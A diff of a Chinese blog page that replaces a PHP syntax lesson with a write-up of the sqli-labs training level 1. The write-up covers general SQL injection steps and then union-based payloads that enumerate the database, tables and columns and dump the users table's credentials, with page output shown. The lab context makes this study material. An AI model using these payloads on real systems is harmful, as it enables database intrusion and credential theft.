@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/12/21/php学习2022-12-21/"/>
+  <link rel="canonical" href="http://example.com/2022/12/21/sqli-labs-1/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -32,21 +32,21 @@
   <!-- feed -->
       <link rel="alternate" href="/atom.xml" title="k10." type="application/atom+xml">
   <!-- 页面元数据 -->
-  <title>php学习2022-12-21 - k10.</title>
-  <meta name="keywords" content="php语法学习,null">
-  <meta desc name="description" content="php语法学习(常量、运算符、字符串函数) - ChenZhengkai10 - k10.">
+  <title>sqli-labs-1 - k10.</title>
+  <meta name="keywords" content="sqli-labs,null">
+  <meta desc name="description" content="这是我的专属博客 - ChenZhengkai10 - k10.">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="php学习2022-12-21">
-<meta property="og:url" content="http://example.com/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/index.html">
+<meta property="og:title" content="sqli-labs-1">
+<meta property="og:url" content="http://example.com/2022/12/21/sqli-labs-1/index.html">
 <meta property="og:site_name" content="k10.">
-<meta property="og:description" content="php语法学习(常量、运算符、字符串函数)">
+<meta property="og:description" content="sqli-labs-1SQL注入哪里存在SQL注入？· GET· POST· HTTP头部注入· Cookie注入 sql注入的类型1、字符型注入2、数字型注入 MySQL中3种注释风格 ‘#’ （url编码为%23）‘–’ （–后边要跟上一个或多个空格 –+）  判断注入点 and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同（整形判断）单引号判断 ‘ 显示数据库错误信">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-12-21T08:09:10.000Z">
-<meta property="article:modified_time" content="2022-12-21T08:32:32.771Z">
+<meta property="article:published_time" content="2022-12-21T12:20:08.000Z">
+<meta property="article:modified_time" content="2022-12-21T14:00:34.855Z">
 <meta property="article:author" content="ChenZhengkai10">
-<meta property="article:tag" content="php语法学习">
+<meta property="article:tag" content="sqli-labs">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2453,7 +2453,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/21/php学习2022-12-21/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/21/sqli-labs-1/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="k10.">
   </span>
@@ -2474,7 +2474,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        php学习2022-12-21
+        sqli-labs-1
       </h1>
       <div class='new-meta-box'>
         
@@ -2493,10 +2493,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/php%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/">php语法学习</a>
+    <a class="category-link" href="/categories/sqli-labs/">sqli-labs</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/php%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/" itemprop="url"><span itemprop="name">php语法学习</span></a>
+        <a href="/categories/sqli-labs/" itemprop="url"><span itemprop="name">sqli-labs</span></a>
       </span>
     
   </div>
@@ -2505,7 +2505,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-12-21T16:09:10+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-12-21T20:20:08+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
     <p>发布于：Dec 21, 2022</p>
@@ -2531,38 +2531,122 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="php语法学习-常量、运算符、字符串函数"><a href="#php语法学习-常量、运算符、字符串函数" class="headerlink" title="php语法学习(常量、运算符、字符串函数)"></a>php语法学习(常量、运算符、字符串函数)</h1><span id="more"></span>
-<hr>
-<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><blockquote>
-<p>设置常量通常用define()函数<br>define(“常量的名称”,”常量的值”,(可定义为true也可不写));<br>例：</p>
+    <h1 id="sqli-labs-1"><a href="#sqli-labs-1" class="headerlink" title="sqli-labs-1"></a>sqli-labs-1</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="哪里存在SQL注入？"><a href="#哪里存在SQL注入？" class="headerlink" title="哪里存在SQL注入？"></a>哪里存在SQL注入？</h3><p><strong>·</strong> <strong>GET</strong><br><strong>·</strong> <strong>POST</strong><br><strong>·</strong> <strong>HTTP头部注入</strong><br><strong>·</strong> <strong>Cookie注入</strong></p>
+<h3 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h3><p>1、字符型注入<br>2、数字型注入</p>
+<h3 id="MySQL中3种注释风格"><a href="#MySQL中3种注释风格" class="headerlink" title="MySQL中3种注释风格"></a>MySQL中3种注释风格</h3><blockquote>
+<p>‘#’ （url编码为%23）<br>‘–’ （–后边要跟上一个或多个空格 –+）</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    define(&quot;kx&quot;,&quot;czk Love ltx&quot;);    //常量名不需要加$,且常量是全局的</span><br><span class="line">    echo kx;    //输出：czk Love ltx</span><br><span class="line">    echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    echo KX;    //无法输出，未定义大写</span><br><span class="line">    echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">    define(&quot;tz&quot;,&quot;czk Love ltx&quot;, true);</span><br><span class="line">    echo tz;    //输出：czk Love ltx</span><br><span class="line">    echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    echo TZ;    //输出：czk Love ltx</span><br><span class="line">    echo &#x27;&lt;br&gt;&#x27;;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>1.第一个””是name:必选参数，常量名称，即标志符’<br>2.第二个””是value：必选参数，常量的值。<br>3.最后一个交case_insensitive,可选参数，如果设置为TRUE，该常量则大小写不敏感，默认是大小写敏感的。</p>
-<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="与c语言大致相同的运算符"><a href="#与c语言大致相同的运算符" class="headerlink" title="与c语言大致相同的运算符"></a>与c语言大致相同的运算符</h3><blockquote>
-<p>‘+’加  ‘-’减  ‘<em>’乘  ‘&#x2F;’除  ‘%’取余  与c基本相同<br>赋值运算符也与c语言大致相同<br>递增&#x2F;递减运算符也与c语言大致相同<br>比较运算符也大致与c相同<br>另外：*<em>‘&lt;&gt;’不等于  ‘！&#x3D;&#x3D;’不全等(完全不同)</em></em></p>
-<p>逻辑运算符，大致也与c相同<br>‘and’与  ‘or’或  ‘xor’异或  ‘&amp;&amp;’与  ‘||’或  ‘!’非</p>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><blockquote>
+<p>and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同（整形判断）<br>单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断）</p>
 </blockquote>
-<h3 id="x3D-x3D-和-x3D-x3D-x3D"><a href="#x3D-x3D-和-x3D-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;</h3><p>在php中<br>使用两个等号（&#x3D;&#x3D;）比较，只比较值，不比较类型<br>用三个等号（&#x3D;&#x3D;&#x3D;）比较，都比较<br>例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(42 == &quot;42&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;值相等&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    if(42 === &quot;42&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;类型相等&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;类型不相等&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>输出为：值相等   类型不相等</p>
-<h3 id="‘-’串接-‘-x3D-’串接赋值"><a href="#‘-’串接-‘-x3D-’串接赋值" class="headerlink" title="‘.’串接  ‘.&#x3D;’串接赋值"></a>‘.’串接  ‘.&#x3D;’串接赋值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $txt1 = &quot;Hello World!&quot;;</span><br><span class="line">    $txt2 = &quot;Hello PHP!&quot;;</span><br><span class="line">    echo $txt1 . &quot; &quot; . $txt2;   //输出Hello World! Hello PHP!</span><br><span class="line">    echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">    $a = &quot;Hello&quot;;</span><br><span class="line">    $b = $a . &quot; world!&quot;;</span><br><span class="line">    echo $b;                    //输出 Hello world!</span><br><span class="line">    echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="intdiv（）函数"><a href="#intdiv（）函数" class="headerlink" title="intdiv（）函数"></a>intdiv（）函数</h3><p>intdiv（）函数：该函数返回值为第一个参数除于第二个参数的值并取等（向下取等）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    var_dump(intdiv(10, 3));    //返回值为3</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="1、判断列数"><a href="#1、判断列数" class="headerlink" title="1、判断列数"></a>1、判断列数</h4><blockquote>
+<p>order by 1<br>order by 2<br>…<br>order by 70</p>
+</blockquote>
+<h4 id="2、判断显示位"><a href="#2、判断显示位" class="headerlink" title="2、判断显示位"></a>2、判断显示位</h4><blockquote>
+<p>url?id&#x3D;-1 union select 1,2,3,4,5</p>
+</blockquote>
+<h4 id="3、获取当数据库名称和当前连接数据库的用户"><a href="#3、获取当数据库名称和当前连接数据库的用户" class="headerlink" title="3、获取当数据库名称和当前连接数据库的用户"></a>3、获取当数据库名称和当前连接数据库的用户</h4><blockquote>
+<p>url?id&#x3D;-1 union select 1,2,databaes(),4,5<br>url?id&#x3D;-1 union select 1,2,user(),4,5</p>
+</blockquote>
+<h4 id="4、列出所有数据库"><a href="#4、列出所有数据库" class="headerlink" title="4、列出所有数据库"></a>4、列出所有数据库</h4><blockquote>
+<p><strong>limit 一个一个打印出来库名</strong><br>select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1<br><strong>group_concat 一次性全部显示</strong><br>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</p>
+</blockquote>
+<h4 id="5、列出-数据库：test-中所有的表"><a href="#5、列出-数据库：test-中所有的表" class="headerlink" title="5、列出(数据库：test)中所有的表"></a>5、列出(数据库：test)中所有的表</h4><blockquote>
+<p><strong>limit 一个一个打印出来字段名</strong><br>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;‘test’<br>limit 0,1<br><strong>group_concat 一次性全部显示</strong><br>select group_concat(TABLE_NAME) from information_schema.TABLES where<br>TABLE_SCHEMA&#x3D;0x674657374<br>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</p>
+</blockquote>
+<h4 id="6、列出（数据库：test-表：admin-）中所有的字段"><a href="#6、列出（数据库：test-表：admin-）中所有的字段" class="headerlink" title="6、列出（数据库：test 表：admin ）中所有的字段"></a>6、列出（数据库：test 表：admin ）中所有的字段</h4><blockquote>
+<p><strong>limit 一个一个打印出来</strong><br>select COLUMN_NAME from information_schema.COLUMNS where<br>TABLE_SCHEMA&#x3D;‘baji’ and TABLE_NAME&#x3D;‘users’ limit 0,1<br><strong>group_concat 一次性全部显示</strong><br>select group_concat(COLUMN_NAME) from information_schema.COLUMNS where<br>TABLE_SCHEMA&#x3D;0x74657374 and TABLE_NAME&#x3D;0x61646d696e</p>
+</blockquote>
+<h4 id="7、列出（数据库：test-表：admin-）中的数据"><a href="#7、列出（数据库：test-表：admin-）中的数据" class="headerlink" title="7、列出（数据库：test 表：admin ）中的数据"></a>7、列出（数据库：test 表：admin ）中的数据</h4><blockquote>
+<p><strong>limit 一个一个打印出来</strong><br>select username,passwd from test.admin limit 0,1<br><strong>group_concat 把 一次性全部打印</strong><br>select group_concat(concat(username,0x20,passwd)) from test.admin<br>network</p>
+</blockquote>
+<p>本文参考参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/93498444">https://blog.csdn.net/qq_37133717/article/details/93498444</a></p>
+<h2 id="sqli-labs-1-1"><a href="#sqli-labs-1-1" class="headerlink" title="sqli-labs-1"></a>sqli-labs-1</h2><p>通过题目的名字”GET-Error based - Single quotes - String(基于 GET 错误 - 单引号 - 字符串)”可知，题目是一个单引号引起的字符型</p>
+<p>在url后面输入?id&#x3D;1 and 1&#x3D;1,url?id&#x3D;1 1&#x3D;2后发现页面正常没有不同，考虑为字符型<br>添加单引号后，页面出现</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>可以看到存在’’包装<br>继续在后面添加–+</p>
+<blockquote>
+<p>url?id&#x3D;1’ –+<br>发现页面异常，存在单引号的注入问题</p>
+</blockquote>
+<h3 id="用order-by猜解列数"><a href="#用order-by猜解列数" class="headerlink" title="用order by猜解列数"></a>用order by猜解列数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 order 1 --+</span><br></pre></td></tr></table></figure>
+<p>依次使用</p>
+<blockquote>
+<p>order 2<br>order 3<br>order 4<br><strong>页面显示Unknown column ‘4’ in ‘order clause’</strong><br>说明一共有三个字段</p>
+</blockquote>
+<h3 id="显示回显位"><a href="#显示回显位" class="headerlink" title="显示回显位"></a>显示回显位</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:2<br>Your Password:3<br>得出可显字段为2和3<br>所以我们查找数据库</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:security<br>Your Password:3<br>得出数据库名称为：security</p>
+</blockquote>
+<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><h4 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:emails,referers,uagents,users<br>Your Password:3<br>得出表名为emails,referers,uagents,users</p>
+</blockquote>
+<h4 id="查询列明"><a href="#查询列明" class="headerlink" title="查询列明"></a>查询列明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p> Your Login name:id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password<br>Your Password:3<br>得出列名为id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password</p>
+</blockquote>
+<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,username,password from users limit 0,1 --+</span><br></pre></td></tr></table></figure>
+<p><em>这里采用limit 0,1，因为用group_concat（）一次爆出多条数据，不方便我们查看相对应的用户名和密码</em></p>
+<p>依次增加0,1   1,1   2,1   3,1直至页面无数据显示<br>将分别得到的内容整合成一个表，如下：</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Dumb</td>
+<td>Dumb</td>
+</tr>
+<tr>
+<td>Angelina</td>
+<td>I-kill-you</td>
+</tr>
+<tr>
+<td>Dummy</td>
+<td>p@ssword</td>
+</tr>
+<tr>
+<td>secure</td>
+<td>crappy</td>
+</tr>
+<tr>
+<td>stupid</td>
+<td>stupidity</td>
+</tr>
+<tr>
+<td>superman</td>
+<td>genious</td>
+</tr>
+<tr>
+<td>batman</td>
+<td>mob!le</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>admin</td>
+</tr>
+</tbody></table>
+<p>若想直接爆出所有用户名和密码可以这样写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin<br>按顺序对应各自的username和password</p>
+</blockquote>
 
-<h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><blockquote>
-<p>定义一个txt1,供下方函数使用</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $txt1 = &quot;Hello World!&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h3><p>strlen()返回字符串的长度</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo strlen($txt1);     //输出字符串长度12</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="str-word-count"><a href="#str-word-count" class="headerlink" title="str_word_count()"></a>str_word_count()</h3><p>str_word_count()对字符串中的单词进行计数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo str_word_count(&quot;$txt1&quot;);   //输出2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><p>strrev()反转字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo strrev($txt1);     //输出!dlroW olleH</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><p>strpos()检索字符串内指定的字符或文本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo strpos(&quot;$txt1&quot;,&quot;World&quot;);   //输出6</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace()"></a>str_replace()</h3><p>str_replace()替换字符串中的文本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo str_replace(&quot;World&quot;,&quot;Kitty&quot;,&quot;$txt1&quot;);  //输出Hello Kitty!</span><br><span class="line">    echo $txt1;     //输出：Hello World!  不改变变量的内容</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
   </div>
   
   
@@ -2586,7 +2670,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-12-21T16:32:32+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-12-21T22:00:34+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Dec 21, 2022</p>
@@ -2598,8 +2682,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/php%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>php语法学习</p></a></div>
-  <span hidden itemprop="keywords">php语法学习</span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/sqli-labs/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>sqli-labs</p></a></div>
+  <span hidden itemprop="keywords">sqli-labs</span>
 
 
         
@@ -2612,7 +2696,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/&title=php学习2022-12-21 - k10.&summary=php语法学习(常量、运算符、字符串函数)"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/12/21/sqli-labs-1/&title=sqli-labs-1 - k10.&summary="
           
           >
           
@@ -2624,7 +2708,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/&title=php学习2022-12-21 - k10.&summary=php语法学习(常量、运算符、字符串函数)"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/12/21/sqli-labs-1/&title=sqli-labs-1 - k10.&summary="
           
           >
           
@@ -2636,7 +2720,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/&title=php学习2022-12-21 - k10.&summary=php语法学习(常量、运算符、字符串函数)"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/12/21/sqli-labs-1/&title=sqli-labs-1 - k10.&summary="
           
           >
           
@@ -2669,21 +2753,15 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/12/21/sqli-labs-1/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>sqli-labs-1</p>
-          <p class='content'>sqli-labs-1SQL注入哪里存在SQL注入？· GET· POST· HTTP头部注入· Cookie注入
-sql注入的类型1、字符型注入2、数字型注入
-MySQL中3种注释风格
-‘#’...</p>
-        </a>
       
-      
-        <a class='next' href='/2022/12/20/php%E5%AD%A6%E4%B9%A02022-12-20/'>
-          <p class='title'>php学习2022-12-20<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>php语法学习(EOF、数据变量)
+        <a class='next' href='/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/'>
+          <p class='title'>php学习2022-12-21<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>php语法学习(常量、运算符、字符串函数)
 
-打印Hello World！123&lt;?php    echo &quot;Hello World!&quot;;?&gt;
-php EOF输出一段要输...</p>
+常量
+设置常量通常用define()函数define(“常量的名称”,”常量的值”,(可定义为true也可不写));例：
+
+123456789101...</p>
         </a>
       
     </div>
@@ -2699,7 +2777,7 @@ php EOF输出一段要输...</p>
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/12/21/sqli-labs-1/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2741,7 +2819,7 @@ php EOF输出一段要输...</p>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E9%87%8F"><span class="toc-text">常量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">运算符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8Ec%E8%AF%AD%E8%A8%80%E5%A4%A7%E8%87%B4%E7%9B%B8%E5%90%8C%E7%9A%84%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">与c语言大致相同的运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x3D-x3D-%E5%92%8C-x3D-x3D-x3D"><span class="toc-text">&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%98-%E2%80%99%E4%B8%B2%E6%8E%A5-%E2%80%98-x3D-%E2%80%99%E4%B8%B2%E6%8E%A5%E8%B5%8B%E5%80%BC"><span class="toc-text">‘.’串接  ‘.&#x3D;’串接赋值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intdiv%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0"><span class="toc-text">intdiv（）函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="toc-text">字符串函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#strlen"><span class="toc-text">strlen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#str-word-count"><span class="toc-text">str_word_count()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strrev"><span class="toc-text">strrev()</span></a></li><li 